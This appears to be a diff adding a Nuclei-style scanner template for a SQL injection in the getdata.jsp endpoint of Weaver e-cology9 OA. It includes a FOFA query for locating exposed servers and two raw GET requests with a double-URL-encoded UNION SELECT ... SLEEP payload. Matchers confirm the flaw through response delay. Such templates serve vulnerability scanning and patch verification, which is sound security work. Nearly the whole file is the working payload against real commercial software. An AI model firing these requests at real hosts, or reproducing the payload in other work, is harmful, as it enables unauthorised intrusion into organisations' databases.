@@ -1,0 +1,29 @@
+id: Weaver-E-Cology9-getdata_jsp-sql-QVD-2025-23834
+
+info:
+  name: 泛微E Cology9 getdata.jsp SQL注入漏洞(QVD-2025-23834)
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="泛微-OA（e-cology）"
+    该漏洞是由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现 SQL 注入漏洞。
+  reference:
+    - https://mp.weixin.qq.com/s/UDnmgJuNF61ANVRTbnYOHQ
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2534%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+      - |
+        GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2538%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
